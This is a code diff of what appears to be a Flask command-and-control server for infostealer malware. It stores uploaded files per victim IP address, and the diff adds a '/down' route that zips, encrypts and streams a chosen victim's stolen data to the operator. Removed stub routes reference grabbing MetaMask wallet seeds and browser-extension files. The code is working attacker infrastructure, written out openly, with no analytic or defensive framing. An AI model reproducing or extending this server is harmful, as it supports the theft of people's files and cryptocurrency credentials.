@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, Response
+from flask import Flask, request, Response
 from models.victim import Victim
 from models.crypto import CryptoOps
 
@@ -26,6 +26,9 @@ def up():
     """
     CurrentVictim = Victim(request.remote_addr)
     NameHeader = request.headers.get("name")
+    if NameHeader is None or len(request.data):
+        return '', 400
+
     FilePath = CurrentVictim.GetFileStoragePath(NameHeader)
 
     dataout = open(FilePath, 'wb')
@@ -128,14 +131,31 @@ def GetVictimData():
     return 'sir t9awd', 400
 
 
-@app.route("/GetExtentionSeed", methods=["GET"])
-def GetMetamaskSeed():
-    pass
+@app.route("/down", methods=["GET"])
+def down():
+    """
+    route for downloading all victims data
 
+    return:
+        bytes = encrypted zip file.
+    """
+    VictimIP = request.headers.get("TARGET")
+    if VictimIP is not None:
+        VictimIP = crypt.DecryptBuffer(VictimIP)
+        CurrentVictim = Victim(VictimIP)
 
-@app.route("/GetExtentionFiles", methods=["GET"])
-def GetExtentionFiles():
-    pass
+        if CurrentVictim.IsNew is True:
+            return 'The requested victim does not exist', 204
+
+        FileName = CurrentVictim.ZipVictimFolder()
+        file = open(FileName, "rb")
+        data = crypt.EncryptBuffer(file.read())
+        file.close()
+        CurrentVictim.RemoveVictimZip()
+
+        return Response(SendAsChunks(data, 102400), status=200, content_type='text/plain')
+
+    return 'sir t9awd', 400
 
 
 if __name__ == '__main__':
